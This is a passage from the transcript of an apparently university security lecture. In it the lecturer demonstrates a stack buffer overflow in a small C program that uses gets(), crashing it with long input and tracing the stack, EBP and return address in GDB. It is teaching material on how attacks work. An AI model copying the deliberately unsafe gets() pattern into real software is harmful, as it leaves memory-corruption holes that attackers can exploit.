            </slice>
            <slice>
              <time_slice>48:28</time_slice>
              <text_slice>deliver to this web
server, that's fair game.</text_slice>
            </slice>
            <slice>
              <time_slice>48:30</time_slice>
              <text_slice>Seems like a reasonable
threat model, in practice,</text_slice>
            </slice>
            <slice>
              <time_slice>48:32</time_slice>
              <text_slice>to have in mind.</text_slice>
            </slice>
            <slice>
              <time_slice>48:34</time_slice>
              <text_slice>And I guess the goal is that
this web server shouldn't</text_slice>
            </slice>
            <slice>
              <time_slice>48:39</time_slice>
              <text_slice>allow arbitrary stuff
to go wrong here.</text_slice>
            </slice>
            <slice>
              <time_slice>48:42</time_slice>
              <text_slice>I guess that sort of
goes along with what</text_slice>
            </slice>
            <slice>
              <time_slice>48:44</time_slice>
              <text_slice>the programmer intended.</text_slice>
            </slice>
            <slice>
              <time_slice>48:45</time_slice>
              <text_slice>The programmer probably
didn't intend any request</text_slice>
            </slice>
            <slice>
              <time_slice>48:47</time_slice>
              <text_slice>to be able to access
anything on the server.</text_slice>
            </slice>
            <slice>
              <time_slice>48:49</time_slice>
              <text_slice>And yet, it turns out if you
make certain kinds of mistakes</text_slice>
            </slice>
            <slice>
              <time_slice>48:51</time_slice>
              <text_slice>in writing the web server
software, which is basically</text_slice>
            </slice>
            <slice>
              <time_slice>48:53</time_slice>
              <text_slice>the mechanism here, right?</text_slice>
            </slice>
            <slice>
              <time_slice>48:55</time_slice>
              <text_slice>The web server software is
the thing that takes a request</text_slice>
            </slice>
            <slice>
              <time_slice>48:57</time_slice>
              <text_slice>and looks at it and
makes sure that it's not</text_slice>
            </slice>
            <slice>
              <time_slice>48:59</time_slice>
              <text_slice>going to do something bad, sends
a response back if everything's</text_slice>
            </slice>
            <slice>
              <time_slice>49:01</time_slice>
              <text_slice>OK.</text_slice>
            </slice>
            <slice>
              <time_slice>49:02</time_slice>
              <text_slice>The web server in
this mechanism.</text_slice>
            </slice>
            <slice>
              <time_slice>49:03</time_slice>
              <text_slice>It's enforcing your policy.</text_slice>
            </slice>
            <slice>
              <time_slice>49:05</time_slice>
              <text_slice>And as a result, if the web
server software is buggy,</text_slice>
            </slice>
            <slice>
              <time_slice>49:08</time_slice>
              <text_slice>then you're in trouble.</text_slice>
            </slice>
            <slice>
              <time_slice>49:10</time_slice>
              <text_slice>And one sort of common
problem, if you're</text_slice>
            </slice>
            <slice>
              <time_slice>49:12</time_slice>
              <text_slice>writing software in
C which, you know,</text_slice>
            </slice>
            <slice>
              <time_slice>49:14</time_slice>
              <text_slice>many things are
still written in C</text_slice>
            </slice>
            <slice>
              <time_slice>49:16</time_slice>
              <text_slice>and probably will continue to
be written in C for a while,</text_slice>
            </slice>
            <slice>
              <time_slice>49:19</time_slice>
              <text_slice>you can mismanage your
memory allocations.</text_slice>
            </slice>
            <slice>
              <time_slice>49:21</time_slice>
              <text_slice>And as we saw in this SSL
certificate naming example,</text_slice>
            </slice>
            <slice>
              <time_slice>49:25</time_slice>
              <text_slice>even sort of a single
byte can really</text_slice>
            </slice>
            <slice>
              <time_slice>49:27</time_slice>
              <text_slice>make a huge difference,
in terms of what goes on.</text_slice>
            </slice>
            <slice>
              <time_slice>49:30</time_slice>
              <text_slice>And I guess for
this example, we'll</text_slice>
            </slice>
            <slice>
              <time_slice>49:32</time_slice>
              <text_slice>look at a small piece of code
that's not quite a real web</text_slice>
            </slice>
            <slice>
              <time_slice>49:35</time_slice>
              <text_slice>server.</text_slice>
            </slice>
            <slice>
              <time_slice>49:36</time_slice>
              <text_slice>In the lab, you'll have this
whole picture to play with.</text_slice>
            </slice>
            <slice>
              <time_slice>49:38</time_slice>
              <text_slice>But for lecture, I
just want to give you</text_slice>
            </slice>
            <slice>
              <time_slice>49:41</time_slice>
              <text_slice>a simplified example
so we can talk</text_slice>
            </slice>
            <slice>
              <time_slice>49:43</time_slice>
              <text_slice>about what's sort of at the
core of what's going wrong.</text_slice>
            </slice>
            <slice>
              <time_slice>49:47</time_slice>
              <text_slice>And, in particular, if
this system wakes up,</text_slice>
            </slice>
            <slice>
              <time_slice>49:51</time_slice>
              <text_slice>I will show you sort of
a very small C function.</text_slice>
            </slice>
            <slice>
              <time_slice>49:56</time_slice>
              <text_slice>And we can sort of
see what goes wrong</text_slice>
            </slice>
            <slice>
              <time_slice>49:59</time_slice>
              <text_slice>if you provide different
inputs to that piece of code.</text_slice>
            </slice>
            <slice>
              <time_slice>50:04</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>50:05</time_slice>
              <text_slice>So the C function that I
have in mind is this guy.</text_slice>
            </slice>
            <slice>
              <time_slice>50:13</time_slice>
              <text_slice>Somewhere here.</text_slice>
            </slice>
            <slice>
              <time_slice>50:15</time_slice>
              <text_slice>Oh, yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>50:19</time_slice>
              <text_slice>It's coming on.</text_slice>
            </slice>
            <slice>
              <time_slice>50:21</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>50:23</time_slice>
              <text_slice>So here's the sort of
program I'm talking about,</text_slice>
            </slice>
            <slice>
              <time_slice>50:27</time_slice>
              <text_slice>or I want to use
as an example here.</text_slice>
            </slice>
            <slice>
              <time_slice>50:30</time_slice>
              <text_slice>So this program is just
going to read a request.</text_slice>
            </slice>
            <slice>
              <time_slice>50:32</time_slice>
              <text_slice>And you can sort of
imagine it's going to read</text_slice>
            </slice>
            <slice>
              <time_slice>50:34</time_slice>
              <text_slice>a request from the network.</text_slice>
            </slice>
            <slice>
              <time_slice>50:36</time_slice>
              <text_slice>But for the purposes
of this example,</text_slice>
            </slice>
            <slice>
              <time_slice>50:38</time_slice>
              <text_slice>it's just going to read
a request from whatever</text_slice>
            </slice>
            <slice>
              <time_slice>50:40</time_slice>
              <text_slice>I'm typing in on the keyboard.</text_slice>
            </slice>
            <slice>
              <time_slice>50:42</time_slice>
              <text_slice>And it's going to store
it in a buffer here.</text_slice>
            </slice>
            <slice>
              <time_slice>50:45</time_slice>
              <text_slice>And then it's going to
parse it is an integer</text_slice>
            </slice>
            <slice>
              <time_slice>50:47</time_slice>
              <text_slice>and return the integer.</text_slice>
            </slice>
            <slice>
              <time_slice>50:48</time_slice>
              <text_slice>And the program will then print
whatever integer I get back.</text_slice>
            </slice>
            <slice>
              <time_slice>50:52</time_slice>
              <text_slice>It's like far from a web server.</text_slice>
            </slice>
            <slice>
              <time_slice>50:54</time_slice>
              <text_slice>But we'll at least
see some basics</text_slice>
            </slice>
            <slice>
              <time_slice>50:57</time_slice>
              <text_slice>of how buffer overflows
work and what goes wrong.</text_slice>
            </slice>
            <slice>
              <time_slice>51:00</time_slice>
              <text_slice>So let's see actually what
happens if we run this program.</text_slice>
            </slice>
            <slice>
              <time_slice>51:03</time_slice>
              <text_slice>So I can compile it here.</text_slice>
            </slice>
            <slice>
              <time_slice>51:05</time_slice>
              <text_slice>And actually, you
can sort of see</text_slice>
            </slice>
            <slice>
              <time_slice>51:07</time_slice>
              <text_slice>the-- it's already telling me
what I'm screwing up, right?</text_slice>
            </slice>
            <slice>
              <time_slice>51:10</time_slice>
              <text_slice>The get function is dangerous
and should not be used.</text_slice>
            </slice>
            <slice>
              <time_slice>51:13</time_slice>
              <text_slice>And we'll see in a second
why the compiler is</text_slice>
            </slice>
            <slice>
              <time_slice>51:15</time_slice>
              <text_slice>so intent on telling me this.</text_slice>
            </slice>
            <slice>
              <time_slice>51:18</time_slice>
              <text_slice>And it actually is true.</text_slice>
            </slice>
            <slice>
              <time_slice>51:20</time_slice>
              <text_slice>But for now, suppose
we're a happy go lucky</text_slice>
            </slice>
            <slice>
              <time_slice>51:23</time_slice>
              <text_slice>developer that is willing
to ignore this warning.</text_slice>
            </slice>
            <slice>
              <time_slice>51:26</time_slice>
              <text_slice>So OK.</text_slice>
            </slice>
            <slice>
              <time_slice>51:27</time_slice>
              <text_slice>I run this redirect function,
I provide some input,</text_slice>
            </slice>
            <slice>
              <time_slice>51:30</time_slice>
              <text_slice>and it works.</text_slice>
            </slice>
            <slice>
              <time_slice>51:33</time_slice>
              <text_slice>Let's see if I
provide large inputs.</text_slice>
            </slice>
            <slice>
              <time_slice>51:34</time_slice>
              <text_slice>If I type in some
large number, well,</text_slice>
            </slice>
            <slice>
              <time_slice>51:37</time_slice>
              <text_slice>at least it gives me
some large number.</text_slice>
            </slice>
            <slice>
              <time_slice>51:38</time_slice>
              <text_slice>It basically maxes out to
two to the 31 and prints that</text_slice>
            </slice>
            <slice>
              <time_slice>51:43</time_slice>
              <text_slice>and doesn't go any higher.</text_slice>
            </slice>
            <slice>
              <time_slice>51:44</time_slice>
              <text_slice>So that's maybe not
disastrous, right?</text_slice>
            </slice>
            <slice>
              <time_slice>51:46</time_slice>
              <text_slice>Whatever.</text_slice>
            </slice>
            <slice>
              <time_slice>51:46</time_slice>
              <text_slice>You provided this
ridiculously large number.</text_slice>
            </slice>
            <slice>
              <time_slice>51:49</time_slice>
              <text_slice>You got something
didn't quite work.</text_slice>
            </slice>
            <slice>
              <time_slice>51:51</time_slice>
              <text_slice>It's not quite a problem yet.</text_slice>
            </slice>
            <slice>
              <time_slice>51:53</time_slice>
              <text_slice>But if we provide some
really large input,</text_slice>
            </slice>
            <slice>
              <time_slice>51:55</time_slice>
              <text_slice>we might get some
other problem, right?</text_slice>
            </slice>
            <slice>
              <time_slice>51:57</time_slice>
              <text_slice>So suppose I provide
in a lot of by 12</text_slice>
            </slice>
            <slice>
              <time_slice>52:00</time_slice>
              <text_slice>I just provided things
that are not numbers.</text_slice>
            </slice>
            <slice>
              <time_slice>52:03</time_slice>
              <text_slice>It prints zero.</text_slice>
            </slice>
            <slice>
              <time_slice>52:04</time_slice>
              <text_slice>That's not so bad.</text_slice>
            </slice>
            <slice>
              <time_slice>52:06</time_slice>
              <text_slice>But suppose I'm going to
paste in a huge number of As.</text_slice>
            </slice>
            <slice>
              <time_slice>52:10</time_slice>
              <text_slice>OK, so now the program crashes.</text_slice>
            </slice>
            <slice>
              <time_slice>52:13</time_slice>
              <text_slice>Maybe not too surprising.</text_slice>
            </slice>
            <slice>
              <time_slice>52:14</time_slice>
              <text_slice>So if it was the case that if
I send a bad request to the web</text_slice>
            </slice>
            <slice>
              <time_slice>52:18</time_slice>
              <text_slice>server, it just doesn't get back
to me or doesn't send a reply,</text_slice>
            </slice>
            <slice>
              <time_slice>52:20</time_slice>
              <text_slice>that would be fine.</text_slice>
            </slice>
            <slice>
              <time_slice>52:21</time_slice>
              <text_slice>But we'll sort of
look inside and see</text_slice>
            </slice>
            <slice>
              <time_slice>52:23</time_slice>
              <text_slice>what happens, and try to
figure out how we can actually</text_slice>
            </slice>
            <slice>
              <time_slice>52:25</time_slice>
              <text_slice>take advantage of this crash
to maybe do something much more</text_slice>
            </slice>
            <slice>
              <time_slice>52:30</time_slice>
              <text_slice>interesting, or, well, much more
along with what a hacker might</text_slice>
            </slice>
            <slice>
              <time_slice>52:35</time_slice>
              <text_slice>be interested in doing.</text_slice>
            </slice>
            <slice>
              <time_slice>52:37</time_slice>
              <text_slice>So to do this, we're
going to run this program</text_slice>
            </slice>
            <slice>
              <time_slice>52:39</time_slice>
              <text_slice>under a debugger.</text_slice>
            </slice>
            <slice>
              <time_slice>52:40</time_slice>
              <text_slice>You'll get super familiar
with this in lab one.</text_slice>
            </slice>
            <slice>
              <time_slice>52:43</time_slice>
              <text_slice>But for now, what
we're going to do</text_slice>
            </slice>
            <slice>
              <time_slice>52:45</time_slice>
              <text_slice>is set a breakpoint in
that redirect function.</text_slice>
            </slice>
            <slice>
              <time_slice>52:49</time_slice>
              <text_slice>And we're going to sort of run
along and see what happens.</text_slice>
            </slice>
            <slice>
              <time_slice>52:52</time_slice>
              <text_slice>So when I run the
program, it's going</text_slice>
            </slice>
            <slice>
              <time_slice>52:54</time_slice>
              <text_slice>to start executing
in the main function.</text_slice>
            </slice>
            <slice>
              <time_slice>52:56</time_slice>
              <text_slice>And pretty quickly,
it calls redirect.</text_slice>
            </slice>
            <slice>
              <time_slice>52:58</time_slice>
              <text_slice>And the debugger is now stopped
at the beginning of redirect.</text_slice>
            </slice>
            <slice>
              <time_slice>53:01</time_slice>
              <text_slice>And we can actually see what's
going on here by, for example,</text_slice>
            </slice>
            <slice>
              <time_slice>53:06</time_slice>
              <text_slice>we can ask it to print
the current CPU registers.</text_slice>
            </slice>
            <slice>
              <time_slice>53:09</time_slice>
              <text_slice>We're going to look at
really low level stuff</text_slice>
            </slice>
            <slice>
              <time_slice>53:11</time_slice>
              <text_slice>here, as opposed to at the
level of C source code.</text_slice>
            </slice>
            <slice>
              <time_slice>53:13</time_slice>
              <text_slice>We're going to look at
the actual instructions</text_slice>
            </slice>
            <slice>
              <time_slice>53:15</time_slice>
              <text_slice>that my machine is
executing because that's</text_slice>
            </slice>
            <slice>
              <time_slice>53:16</time_slice>
              <text_slice>what really is going on.</text_slice>
            </slice>
            <slice>
              <time_slice>53:17</time_slice>
              <text_slice>The C is actually maybe
hiding some things from us.</text_slice>
            </slice>
            <slice>
              <time_slice>53:20</time_slice>
              <text_slice>So you can actually
print all the registers.</text_slice>
            </slice>
            <slice>
              <time_slice>53:23</time_slice>
              <text_slice>So on x86, as you
might remember.</text_slice>
            </slice>
            <slice>
              <time_slice>53:25</time_slice>
              <text_slice>Well, on [INAUDIBLE]
architecture,</text_slice>
            </slice>
            <slice>
              <time_slice>53:27</time_slice>
              <text_slice>there's a stack pointer.</text_slice>
            </slice>
            <slice>
              <time_slice>53:29</time_slice>
              <text_slice>So let me start maybe drawing
this diagram on the board</text_slice>
            </slice>
            <slice>
              <time_slice>53:32</time_slice>
              <text_slice>so we can try to reconstruct
what's happening.</text_slice>
            </slice>
            <slice>
              <time_slice>53:36</time_slice>
              <text_slice>So what's going on is that
my program, not surprisingly,</text_slice>
            </slice>
            <slice>
              <time_slice>53:39</time_slice>
              <text_slice>has a stack.</text_slice>
            </slice>
            <slice>
              <time_slice>53:41</time_slice>
              <text_slice>On x86, the stack grows down.</text_slice>
            </slice>
            <slice>
              <time_slice>53:43</time_slice>
              <text_slice>So it sort of is
this stack like this.</text_slice>
            </slice>
            <slice>
              <time_slice>53:46</time_slice>
              <text_slice>And we can keep
pushing stuff onto it.</text_slice>
            </slice>
            <slice>
              <time_slice>53:49</time_slice>
              <text_slice>So right now, the
stack pointer points</text_slice>
            </slice>
            <slice>
              <time_slice>53:51</time_slice>
              <text_slice>at this particular
memory location FFD010.</text_slice>
            </slice>
            <slice>
              <time_slice>53:58</time_slice>
              <text_slice>So some value.</text_slice>
            </slice>
            <slice>
              <time_slice>53:59</time_slice>
              <text_slice>So you can try to figure
out, how did it get there?</text_slice>
            </slice>
            <slice>
              <time_slice>54:01</time_slice>
              <text_slice>One way to do it is to
disassemble the code</text_slice>
            </slice>
            <slice>
              <time_slice>54:05</time_slice>
              <text_slice>of this redirect function.</text_slice>
            </slice>
            <slice>
              <time_slice>54:12</time_slice>
              <text_slice>Is this going to work better?</text_slice>
            </slice>
            <slice>
              <time_slice>54:14</time_slice>
              <text_slice>Really?</text_slice>
            </slice>
            <slice>
              <time_slice>54:15</time_slice>
              <text_slice>Convenience variable
must have integer value.</text_slice>
            </slice>
            <slice>
              <time_slice>54:20</time_slice>
              <text_slice>Man.</text_slice>
            </slice>
            <slice>
              <time_slice>54:21</time_slice>
              <text_slice>What is going on
with my debugger?</text_slice>
            </slice>
            <slice>
              <time_slice>54:28</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>54:28</time_slice>
              <text_slice>Well, we can disassemble
the function by name.</text_slice>
            </slice>
            <slice>
              <time_slice>54:31</time_slice>
              <text_slice>So this is what the
function is doing.</text_slice>
            </slice>
            <slice>
              <time_slice>54:33</time_slice>
              <text_slice>So first off, it starts
by manipulating something</text_slice>
            </slice>
            <slice>
              <time_slice>54:36</time_slice>
              <text_slice>with this EBP register.</text_slice>
            </slice>
            <slice>
              <time_slice>54:37</time_slice>
              <text_slice>That's not super interesting.</text_slice>
            </slice>
            <slice>
              <time_slice>54:38</time_slice>
              <text_slice>But the first thing
it does after that is</text_slice>
            </slice>
            <slice>
              <time_slice>54:40</time_slice>
              <text_slice>subtract a certain value
from the stack pointer.</text_slice>
            </slice>
            <slice>
              <time_slice>54:43</time_slice>
              <text_slice>This is, basically, it's making
space for all those variables,</text_slice>
            </slice>
            <slice>
              <time_slice>54:46</time_slice>
              <text_slice>like the buffer and the integer,
i, we saw in the C source code.</text_slice>
            </slice>
            <slice>
              <time_slice>54:50</time_slice>
              <text_slice>So we're actually,
now, four instructions</text_slice>
            </slice>
            <slice>
              <time_slice>54:53</time_slice>
              <text_slice>into the function, here.</text_slice>
            </slice>
            <slice>
              <time_slice>54:55</time_slice>
              <text_slice>So that stack
pointer value that we</text_slice>
            </slice>
            <slice>
              <time_slice>54:57</time_slice>
              <text_slice>saw before is actually already
in the middle, so to say,</text_slice>
            </slice>
            <slice>
              <time_slice>55:01</time_slice>
              <text_slice>of the stack.</text_slice>
            </slice>
            <slice>
              <time_slice>55:02</time_slice>
              <text_slice>And currently,
there's stuff above it</text_slice>
            </slice>
            <slice>
              <time_slice>55:06</time_slice>
              <text_slice>that is going to be the
buffer, that integer</text_slice>
            </slice>
            <slice>
              <time_slice>55:09</time_slice>
              <text_slice>value, and actually,
also the return address</text_slice>
            </slice>
            <slice>
              <time_slice>55:12</time_slice>
              <text_slice>into the main function
goes on the stack, as well.</text_slice>
            </slice>
            <slice>
              <time_slice>55:14</time_slice>
              <text_slice>So somewhere here, we'll
have the return address.</text_slice>
            </slice>
            <slice>
              <time_slice>55:17</time_slice>
              <text_slice>And we actually
try to figure out,</text_slice>
            </slice>
            <slice>
              <time_slice>55:19</time_slice>
              <text_slice>where are things on the stack?</text_slice>
            </slice>
            <slice>
              <time_slice>55:20</time_slice>
              <text_slice>So we can print the address
of that buffer variable.</text_slice>
            </slice>
            <slice>
              <time_slice>55:26</time_slice>
              <text_slice>So the buffer variable
is at address D02C.</text_slice>
            </slice>
            <slice>
              <time_slice>55:31</time_slice>
              <text_slice>We can also print the
value of that integer, i.</text_slice>
            </slice>
            <slice>
              <time_slice>55:35</time_slice>
              <text_slice>That guy is at D0AC.</text_slice>
            </slice>
            <slice>
              <time_slice>55:38</time_slice>
              <text_slice>So the i is way up on the stack.</text_slice>
            </slice>
            <slice>
              <time_slice>55:40</time_slice>
              <text_slice>But the buffer is a bit lower.</text_slice>
            </slice>
            <slice>
              <time_slice>55:44</time_slice>
              <text_slice>So what's going on is that
we have our buffer here</text_slice>
            </slice>
            <slice>
              <time_slice>55:47</time_slice>
              <text_slice>on the stack, and then
followed above by i and maybe</text_slice>
            </slice>
            <slice>
              <time_slice>55:52</time_slice>
              <text_slice>some other stuff, and
then finally, the return</text_slice>
            </slice>
            <slice>
              <time_slice>55:54</time_slice>
              <text_slice>address into the main
function that called redirect.</text_slice>
            </slice>
            <slice>
              <time_slice>55:57</time_slice>
              <text_slice>And the buffer
is-- this is going,</text_slice>
            </slice>
            <slice>
              <time_slice>56:00</time_slice>
              <text_slice>the stack is growing down.</text_slice>
            </slice>
            <slice>
              <time_slice>56:02</time_slice>
              <text_slice>So these are higher addresses.</text_slice>
            </slice>
            <slice>
              <time_slice>56:07</time_slice>
              <text_slice>So what this means is that
the buffer-- we actually</text_slice>
            </slice>
            <slice>
              <time_slice>56:11</time_slice>
              <text_slice>have to decide, where is the
zeroth element of the buffer,</text_slice>
            </slice>
            <slice>
              <time_slice>56:13</time_slice>
              <text_slice>and where is the 128th
element of this buffer?</text_slice>
            </slice>
            <slice>
              <time_slice>56:16</time_slice>
              <text_slice>So where does the zeroth
element of the buffer go?</text_slice>
            </slice>
            <slice>
              <time_slice>56:20</time_slice>
              <text_slice>Yeah?</text_slice>
            </slice>
            <slice>
              <time_slice>56:22</time_slice>
              <text_slice>Should be at the bottom,
right, because yeah,</text_slice>
            </slice>
            <slice>
              <time_slice>56:24</time_slice>
              <text_slice>higher elements
just keep going up.</text_slice>
            </slice>
            <slice>
              <time_slice>56:25</time_slice>
              <text_slice>So buff of zero is down here.</text_slice>
            </slice>
            <slice>
              <time_slice>56:27</time_slice>
              <text_slice>It just keeps going on.</text_slice>
            </slice>
            <slice>
              <time_slice>56:28</time_slice>
              <text_slice>And buff of 127 is
going to be up there.</text_slice>
            </slice>
            <slice>
              <time_slice>56:31</time_slice>
              <text_slice>And then we'll have
i and other stuff.</text_slice>
            </slice>
            <slice>
              <time_slice>56:34</time_slice>
              <text_slice>OK.</text_slice>
            </slice>
            <slice>
              <time_slice>56:35</time_slice>
              <text_slice>Well, let's see what
happens now if we</text_slice>
            </slice>
            <slice>
              <time_slice>56:36</time_slice>
              <text_slice>provide that input that seemed
to be crashing it before.</text_slice>
            </slice>
            <slice>
              <time_slice>56:39</time_slice>
              <text_slice>So I guess one thing
we can actually</text_slice>
            </slice>
            <slice>
              <time_slice>56:41</time_slice>
              <text_slice>do before this is to see
whether we can actually</text_slice>
            </slice>
            <slice>
              <time_slice>56:43</time_slice>
              <text_slice>find this return address.</text_slice>
            </slice>
            <slice>
              <time_slice>56:45</time_slice>
              <text_slice>Where it actually happens to
live is at the EBP pointer.</text_slice>
            </slice>
            <slice>
              <time_slice>56:48</time_slice>
              <text_slice>This is just a convenient thing
in the x86 calling convention,</text_slice>
            </slice>
            <slice>
              <time_slice>56:52</time_slice>
              <text_slice>that the EBP pointer,
or register, actually</text_slice>
            </slice>
            <slice>
              <time_slice>56:59</time_slice>
              <text_slice>happens to point to something
on the stack which is going</text_slice>
            </slice>
            <slice>
              <time_slice>57:02</time_slice>
              <text_slice>to be called the saved EBP.</text_slice>
            </slice>
            <slice>
              <time_slice>57:06</time_slice>
              <text_slice>It's a separate location, sort
of after all the variables</text_slice>
            </slice>
            <slice>
              <time_slice>57:08</time_slice>
              <text_slice>but before the return address.</text_slice>
            </slice>
            <slice>
              <time_slice>57:10</time_slice>
              <text_slice>And this is the
thing that's being</text_slice>
            </slice>
            <slice>
              <time_slice>57:11</time_slice>
              <text_slice>saved by those first couple
of instructions at the top.</text_slice>
            </slice>
            <slice>
              <time_slice>57:14</time_slice>
              <text_slice>And you actually
sort of examine it.</text_slice>
            </slice>
            <slice>
              <time_slice>57:16</time_slice>
              <text_slice>In GDB you can say, examine x,
some value, so the EBP pointer</text_slice>
            </slice>
            <slice>
              <time_slice>57:23</time_slice>
              <text_slice>value.</text_slice>
            </slice>
            <slice>
              <time_slice>57:24</time_slice>
              <text_slice>So that's the location
of the stack, D0B8.</text_slice>
            </slice>
            <slice>
              <time_slice>57:26</time_slice>
              <text_slice>Indeed, it's actually
above even the i variable.</text_slice>
            </slice>
            <slice>
              <time_slice>57:30</time_slice>
              <text_slice>So it's great.</text_slice>
            </slice>
            <slice>
              <time_slice>57:30</time_slice>
              <text_slice>And it has some other
value that happens</text_slice>
            </slice>
            <slice>
              <time_slice>57:32</time_slice>
              <text_slice>to be the EBP before
this function was called.</text_slice>
            </slice>
            <slice>
              <time_slice>57:36</time_slice>
              <text_slice>But then, sort of one
more memory location</text_slice>
            </slice>
            <slice>
              <time_slice>57:38</time_slice>
              <text_slice>up is going to be
the return address.</text_slice>
            </slice>
            <slice>
              <time_slice>57:40</time_slice>
              <text_slice>So if we print EBP plus four,
there's something else there,</text_slice>
            </slice>
            <slice>
              <time_slice>57:44</time_slice>
              <text_slice>this 0x08048E5F.</text_slice>
            </slice>
            <slice>
              <time_slice>57:48</time_slice>
              <text_slice>And let's actually see
where that's pointing.</text_slice>
            </slice>
            <slice>
              <time_slice>57:51</time_slice>
              <text_slice>So this is something you're
going to do a lot in the lab.</text_slice>
            </slice>
            <slice>
              <time_slice>57:54</time_slice>
              <text_slice>So you can take this address.</text_slice>
            </slice>
            <slice>
              <time_slice>57:56</time_slice>
              <text_slice>And you can try
to disassemble it.</text_slice>
            </slice>
            <slice>
              <time_slice>57:59</time_slice>
              <text_slice>So what is this guy?</text_slice>
            </slice>
            <slice>
              <time_slice>58:00</time_slice>
              <text_slice>Where did we end up?</text_slice>
            </slice>
            <slice>
              <time_slice>58:02</time_slice>
              <text_slice>So GDB actually helpfully
figures out which function</text_slice>
            </slice>
            <slice>
              <time_slice>58:05</time_slice>
              <text_slice>contains that address.</text_slice>
            </slice>
            <slice>
              <time_slice>58:06</time_slice>
              <text_slice>So 5F.</text_slice>
            </slice>
            <slice>
              <time_slice>58:07</time_slice>
              <text_slice>This is the guy that our
return address is pointing to.</text_slice>
            </slice>
            <slice>
              <time_slice>58:11</time_slice>
              <text_slice>And as you can see, this
is the instruction right</text_slice>
            </slice>
            <slice>
              <time_slice>58:13</time_slice>
              <text_slice>after the call to redirect.</text_slice>
            </slice>
            <slice>
              <time_slice>58:16</time_slice>
              <text_slice>So when we return
from redirect, this</text_slice>
            </slice>
            <slice>
              <time_slice>58:17</time_slice>
              <text_slice>is exactly where we're going
to jump and continue execution.</text_slice>
            </slice>
            <slice>
              <time_slice>58:20</time_slice>
              <text_slice>This is, hopefully,
fairly straightforward</text_slice>
            </slice>
            <slice>
              <time_slice>58:22</time_slice>
              <text_slice>stuff from double oh four,
some standard OS class.</text_slice>
            </slice>
            <slice>
              <time_slice>58:25</time_slice>
              <text_slice>OK.</text_slice>
            </slice>
            <slice>
              <time_slice>58:26</time_slice>
              <text_slice>So where are we now?</text_slice>
            </slice>
            <slice>
              <time_slice>58:28</time_slice>
              <text_slice>Just to recap, we can try to
disassemble our instruction</text_slice>
            </slice>
            <slice>
              <time_slice>58:33</time_slice>
              <text_slice>pointer.</text_slice>
            </slice>
            <slice>
              <time_slice>58:33</time_slice>
              <text_slice>So we're at the beginning
of redirect right now.</text_slice>
            </slice>
            <slice>
              <time_slice>58:36</time_slice>
              <text_slice>And we can run for a bit, and
maybe run that getS() function.</text_slice>
            </slice>
            <slice>
              <time_slice>58:43</time_slice>
              <text_slice>So OK, we run next.</text_slice>
            </slice>
            <slice>
              <time_slice>58:45</time_slice>
              <text_slice>What this does is it runs getS()
and it's waiting for getS()</text_slice>
            </slice>
            <slice>
              <time_slice>58:48</time_slice>
              <text_slice>to return.</text_slice>
            </slice>
            <slice>
              <time_slice>58:49</time_slice>
              <text_slice>We can provide our bad input
to getS() and try to get it</text_slice>
            </slice>
            <slice>
              <time_slice>58:51</time_slice>
              <text_slice>to crash again and see what's
going on, really, there, right?</text_slice>
            </slice>
            <slice>
              <time_slice>58:54</time_slice>
              <text_slice>So we can paste a
bunch of As again.</text_slice>
            </slice>
            <slice>
              <time_slice>58:57</time_slice>
              <text_slice>OK.</text_slice>
            </slice>
            <slice>
              <time_slice>58:57</time_slice>
              <text_slice>So we got out of getS() and
things are actually still OK,</text_slice>
            </slice>
            <slice>
              <time_slice>59:00</time_slice>
              <text_slice>right?</text_slice>
            </slice>
            <slice>
              <time_slice>59:00</time_slice>
              <text_slice>The program is still running.</text_slice>
            </slice>
            <slice>
              <time_slice>59:02</time_slice>
              <text_slice>But we can try to figure out,
what is in memory right now</text_slice>
            </slice>
            <slice>
              <time_slice>59:05</time_slice>
              <text_slice>and why are things
going to go wrong?</text_slice>
            </slice>
            <slice>
              <time_slice>59:08</time_slice>
              <text_slice>Actually, what do
you guys think?</text_slice>
            </slice>
            <slice>
              <time_slice>59:10</time_slice>
              <text_slice>What happened, right?</text_slice>
            </slice>
            <slice>
              <time_slice>59:11</time_slice>
              <text_slice>So I printed out a bunch of As.</text_slice>
            </slice>
            <slice>
              <time_slice>59:12</time_slice>
              <text_slice>What did getS()
do to the memory?</text_slice>
            </slice>
            <slice>
              <time_slice>59:16</time_slice>
              <text_slice>Yeah, yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>59:17</time_slice>
              <text_slice>So it just keeps
writing As here, right?</text_slice>
            </slice>
            <slice>
              <time_slice>59:18</time_slice>
              <text_slice>All we actually passed to
getS() was a single pointer,</text_slice>
            </slice>
            <slice>
              <time_slice>59:21</time_slice>
              <text_slice>the start of this
address, right?</text_slice>
            </slice>
            <slice>
              <time_slice>59:23</time_slice>
              <text_slice>So this is the
argument to getS(),</text_slice>
            </slice>
            <slice>
              <time_slice>59:26</time_slice>
              <text_slice>is a pointer to this memory
location on the stack.</text_slice>
            </slice>
            <slice>
              <time_slice>59:28</time_slice>
              <text_slice>So it just kept writing As.</text_slice>
            </slice>
            <slice>
              <time_slice>59:30</time_slice>
              <text_slice>And it doesn't actually
know what the length is,</text_slice>
            </slice>
            <slice>
              <time_slice>59:32</time_slice>
              <text_slice>so it just keeps going, right?</text_slice>
            </slice>
            <slice>
              <time_slice>59:33</time_slice>
              <text_slice>It's going to override As
all the way up the stack,</text_slice>
            </slice>
            <slice>
              <time_slice>59:36</time_slice>
              <text_slice>past the return address,
probably, and into whatever</text_slice>
            </slice>
            <slice>
              <time_slice>59:38</time_slice>
              <text_slice>was up the stack above us.</text_slice>
            </slice>
            <slice>
              <time_slice>59:40</time_slice>
              <text_slice>So we can check whether
that's the case.</text_slice>
            </slice>
            <slice>
              <time_slice>59:42</time_slice>
              <text_slice>So we can actually
print the buffer.</text_slice>
            </slice>
            <slice>
              <time_slice>59:47</time_slice>
              <text_slice>And in fact, it
tells us, yeah, we</text_slice>
            </slice>
            <slice>
              <time_slice>59:48</time_slice>
              <text_slice>have 180 As there,
even though the buffer</text_slice>
            </slice>
            <slice>
              <time_slice>59:51</time_slice>
              <text_slice>should be 128 elements large.</text_slice>
            </slice>
            <slice>
              <time_slice>59:55</time_slice>
              <text_slice>So this is not so great.</text_slice>
            </slice>
            <slice>
              <time_slice>59:57</time_slice>
              <text_slice>And we can actually,
again, examine what's</text_slice>
            </slice>
            <slice>
              <time_slice>59:59</time_slice>
              <text_slice>going on in that EBP pointer.</text_slice>
